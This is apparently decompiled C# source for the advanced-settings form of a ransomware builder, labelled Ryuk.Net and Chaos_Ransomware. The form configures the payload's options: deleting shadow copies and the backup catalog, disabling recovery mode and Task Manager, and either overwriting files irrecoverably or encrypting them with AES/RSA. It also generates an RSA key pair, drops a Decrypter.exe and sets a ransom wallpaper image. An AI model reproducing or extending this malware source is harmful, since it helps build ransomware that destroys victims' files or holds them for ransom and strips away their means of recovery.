﻿using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Security.Cryptography;
using System.Windows.Forms;
using System.Xml.Serialization;
using CustomWindowsForm;
using Chaos_Ransomware.Properties;

namespace Ryuk.Net
{
	// Token: 0x02000002 RID: 2
	public partial class advancedSettingForm : Form
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002050 File Offset: 0x00000250
		public advancedSettingForm()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000002 RID: 2 RVA: 0x0000206C File Offset: 0x0000026C
		private void advancedSettingForm_Load(object sender, EventArgs e)
		{
			bool checkAdminPrivilage = Settings.Default.checkAdminPrivilage;
			if (checkAdminPrivilage)
			{
				this.resistAdminCheckbox.Checked = true;
			}
			else
			{
				this.resistAdminCheckbox.Checked = false;
			}
			bool encryptOption = Settings.Default.encryptOption;
			string decrypterName = Settings.Default.decrypterName;
			if (decrypterName == "")
			{
				this.textBox1.Enabled = true;
			}
			else
			{
				this.textBox1.Text = decrypterName;
				this.textBox1.Enabled = false;
				this.button2.Text = "Public key selected";
			}
			string pathToBase = Settings.Default.pathToBase64;
			if (pathToBase != "")
			{
				this.pathToImageText.Text = pathToBase;
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002145 File Offset: 0x00000345
		private void buttonZ1_Click(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000004 RID: 4 RVA: 0x0000214F File Offset: 0x0000034F
		private void advancedSettingForm_MouseDown(object sender, MouseEventArgs e)
		{
			this.mouseDown = true;
			this.lastLocation = e.Location;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x00002168 File Offset: 0x00000368
		private void advancedSettingForm_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.mouseDown)
			{
				base.Location = new Point(base.Location.X - this.lastLocation.X + e.X, base.Location.Y - this.lastLocation.Y + e.Y);
				base.Update();
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x000021DA File Offset: 0x000003DA
		private void advancedSettingForm_MouseUp(object sender, MouseEventArgs e)
		{
			this.mouseDown = false;
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000021E4 File Offset: 0x000003E4
		private void buttonZ1_Click_1(object sender, EventArgs e)
		{
			base.Close();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000021F0 File Offset: 0x000003F0
		private void resistAdminCheckbox_CheckedChanged(object sender, EventArgs e)
		{
			if (this.resistAdminCheckbox.Checked)
			{
				Settings.Default.checkAdminPrivilage = true;
				this.deleteShadowCopiesCheckbox.Enabled = true;
				this.disableRecoveryModeCheckbox.Enabled = true;
				this.deleteBackupCatalogCheckbox.Enabled = true;
				this.deleteShadowCopiesCheckbox.Checked = true;
				this.disableRecoveryModeCheckbox.Checked = true;
				this.deleteBackupCatalogCheckbox.Checked = true;
				this.taskManager.Checked = true;
				this.taskManager.Enabled = true;
			}
			else
			{
				Settings.Default.checkAdminPrivilage = false;
				this.deleteShadowCopiesCheckbox.Enabled = false;
				this.disableRecoveryModeCheckbox.Enabled = false;
				this.deleteBackupCatalogCheckbox.Enabled = false;
				this.deleteShadowCopiesCheckbox.Checked = false;
				this.disableRecoveryModeCheckbox.Checked = false;
				this.deleteBackupCatalogCheckbox.Checked = false;
				this.taskManager.Checked = false;
				this.taskManager.Enabled = false;
			}
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000022FE File Offset: 0x000004FE
		private void panel1_Paint(object sender, PaintEventArgs e)
		{
		}

		// Token: 0x0600000A RID: 10 RVA: 0x00002304 File Offset: 0x00000504
		private void panel1_MouseMove(object sender, MouseEventArgs e)
		{
			if (this.mouseDown)
			{
				base.Location = new Point(base.Location.X - this.lastLocation.X + e.X, base.Location.Y - this.lastLocation.Y + e.Y);
				base.Update();
			}
		}

		// Token: 0x0600000B RID: 11 RVA: 0x00002376 File Offset: 0x00000576
		private void panel1_MouseUp(object sender, MouseEventArgs e)
		{
			this.mouseDown = false;
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002380 File Offset: 0x00000580
		private void panel1_MouseDown(object sender, MouseEventArgs e)
		{
			this.mouseDown = true;
			this.lastLocation = e.Location;
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002398 File Offset: 0x00000598
		private void deleteShadowCopiesCheckbox_CheckedChanged(object sender, EventArgs e)
		{
			if (this.deleteShadowCopiesCheckbox.Checked)
			{
				Settings.Default.deleteShadowCopies = true;
			}
			else
			{
				Settings.Default.deleteShadowCopies = false;
			}
		}

		// Token: 0x0600000E RID: 14 RVA: 0x000023D8 File Offset: 0x000005D8
		private void deleteBackupCatalogCheckbox_CheckedChanged(object sender, EventArgs e)
		{
			if (this.deleteBackupCatalogCheckbox.Checked)
			{
				Settings.Default.deleteBackupCatalog = true;
			}
			else
			{
				Settings.Default.deleteBackupCatalog = false;
			}
		}

		// Token: 0x0600000F RID: 15 RVA: 0x00002418 File Offset: 0x00000618
		private void disableRecoveryModeCheckbox_CheckedChanged(object sender, EventArgs e)
		{
			if (this.disableRecoveryModeCheckbox.Checked)
			{
				Settings.Default.disableRecoveryMode = true;
			}
			else
			{
				Settings.Default.disableRecoveryMode = false;
			}
		}

		// Token: 0x06000010 RID: 16 RVA: 0x00002458 File Offset: 0x00000658
		private void radioButton1_CheckedChanged(object sender, EventArgs e)
		{
			this.button2.Visible = false;
			this.textBox1.Visible = false;
			this.label2.Visible = false;
			this.overwriteInfoLabel.Text = "This function works faster but files cannot be returned ";
			Settings.Default.encryptOption = false;
		}

		// Token: 0x06000011 RID: 17 RVA: 0x000024AC File Offset: 0x000006AC
		private void radioButton2_CheckedChanged(object sender, EventArgs e)
		{
			this.button2.Visible = true;
			this.textBox1.Visible = true;
			this.label2.Visible = true;
			this.overwriteInfoLabel.Text = "Files will be encrypted with AES / RSA method ";
			Settings.Default.encryptOption = true;
		}

		// Token: 0x06000012 RID: 18 RVA: 0x00002500 File Offset: 0x00000700
		private void button1_Click(object sender, EventArgs e)
		{
			OpenFileDialog openFileDialog = new OpenFileDialog();
			openFileDialog.FilterIndex = 1;
			if (openFileDialog.ShowDialog() == DialogResult.OK)
			{
				string fileName = openFileDialog.FileName;
				string fileName2 = Path.GetFileName(fileName);
				this.textBox1.Text = fileName2;
				MessageBox.Show(fileName);
			}
		}

		// Token: 0x06000013 RID: 19 RVA: 0x00002550 File Offset: 0x00000750
		private void decrypter(string decrypter)
		{
		}

		// Token: 0x06000014 RID: 20 RVA: 0x00002554 File Offset: 0x00000754
		private void button2_Click(object sender, EventArgs e)
		{
			RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(2048);
			RSAParameters rsaparameters = rsacryptoServiceProvider.ExportParameters(true);
			RSAParameters rsaparameters2 = rsacryptoServiceProvider.ExportParameters(false);
			string keyString = advancedSettingForm.GetKeyString(rsaparameters2);
			string keyString2 = advancedSettingForm.GetKeyString(rsaparameters);
			string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
			if (this.textBox1.Text.Contains("-decrypter"))
			{
				string text = this.textBox1.Text;
				if (text == "")
				{
					MessageBox.Show("Decrypter name field is empty!");
				}
				else if (Directory.Exists(text))
				{
					string text2 = directoryName + "\\" + text + "\\publicKey.chaos";
					Settings.Default.publicKey = File.ReadAllText(text2);
					Settings.Default.decrypterName = text;
					MessageBox.Show("Public key selected successfully!");
					this.textBox1.Text = text;
					this.textBox1.Enabled = false;
					this.button2.Text = "Public key selected";
				}
				else
				{
					try
					{
						Directory.CreateDirectory(text);
						string text2 = directoryName + "\\" + text + "\\publicKey.chaos";
						string text3 = directoryName + "\\" + text + "\\privateKey.chaos";
						File.WriteAllText(text2, keyString);
						File.WriteAllText(text3, keyString2);
						byte[] array = Resources.decrypter;
						File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", array);
						Settings.Default.publicKey = File.ReadAllText(text2);
						Settings.Default.decrypterName = text;
						MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
						this.textBox1.Text = text;
						this.textBox1.Enabled = false;
						this.button2.Text = "Public key selected";
					}
					catch
					{
						MessageBox.Show("Unexpected error occured");
					}
				}
			}
			else
			{
				string text = this.textBox1.Text + "-decrypter";
				if (text == "-decrypter")
				{
					MessageBox.Show("Decrypter name field is empty!");
				}
				else if (Directory.Exists(text) || Directory.Exists(text + "-decrypter"))
				{
					string text2 = directoryName + "\\" + text + "\\publicKey.chaos";
					Settings.Default.publicKey = File.ReadAllText(text2);
					Settings.Default.decrypterName = text;
					MessageBox.Show("Decrypter exists. Public key selected successfully!");
					this.textBox1.Text = text;
					this.textBox1.Enabled = false;
					this.button2.Text = "Public key selected";
				}
				else
				{
					try
					{
						Directory.CreateDirectory(text);
						string text2 = directoryName + "\\" + text + "\\publicKey.chaos";
						string text3 = directoryName + "\\" + text + "\\privateKey.chaos";
						File.WriteAllText(text2, keyString);
						File.WriteAllText(text3, keyString2);
						byte[] array = Resources.decrypter;
						File.WriteAllBytes(directoryName + "\\" + text + "\\Decrypter.exe", array);
						Settings.Default.publicKey = File.ReadAllText(text2);
						Settings.Default.decrypterName = text;
						MessageBox.Show("Decrypter created and public key selected successfully. Don't delete or move private key! Without private key files cannot be returned");
						this.textBox1.Text = text;
						this.textBox1.Enabled = false;
						this.button2.Text = "Public key selected";
					}
					catch
					{
						MessageBox.Show("Unexpected error occured");
					}
				}
			}
		}

		// Token: 0x06000015 RID: 21 RVA: 0x0000291C File Offset: 0x00000B1C
		public static string GetKeyString(RSAParameters publicKey)
		{
			StringWriter stringWriter = new StringWriter();
			XmlSerializer xmlSerializer = new XmlSerializer(typeof(RSAParameters));
			xmlSerializer.Serialize(stringWriter, publicKey);
			return stringWriter.ToString();
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002958 File Offset: 0x00000B58
		private void pathToXmlLabel_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000295B File Offset: 0x00000B5B
		private void overwriteInfoLabel_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000018 RID: 24 RVA: 0x0000295E File Offset: 0x00000B5E
		private void textBox1_TextChanged(object sender, EventArgs e)
		{
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002961 File Offset: 0x00000B61
		private void label2_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001A RID: 26 RVA: 0x00002964 File Offset: 0x00000B64
		private void button1_Click_1(object sender, EventArgs e)
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			try
			{
				OpenFileDialog openFileDialog = new OpenFileDialog();
				openFileDialog.Filter = "Image Files(*.jpg; *.jpeg; *.gif; *.bmp)|*.jpg; *.jpeg; *.gif; *.bmp";
				if (openFileDialog.ShowDialog() == DialogResult.OK)
				{
					this.pathToImageText.Text = openFileDialog.FileName;
					byte[] array = File.ReadAllBytes(openFileDialog.FileName);
					string text = Convert.ToBase64String(array);
					Settings.Default.base64Image = text;
					Settings.Default.pathToBase64 = openFileDialog.FileName;
					File.WriteAllText(folderPath + "/sdf.txt", text);
				}
			}
			catch (Exception)
			{
				throw new ApplicationException("Failed loading image");
			}
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002A18 File Offset: 0x00000C18
		private void taskManager_CheckedChanged(object sender, EventArgs e)
		{
			if (this.taskManager.Checked)
			{
				Settings.Default.disableTaskManager = true;
			}
			else
			{
				Settings.Default.disableTaskManager = false;
			}
		}

		// Token: 0x04000001 RID: 1
		private bool mouseDown;

		// Token: 0x04000002 RID: 2
		private Point lastLocation;
	}
}
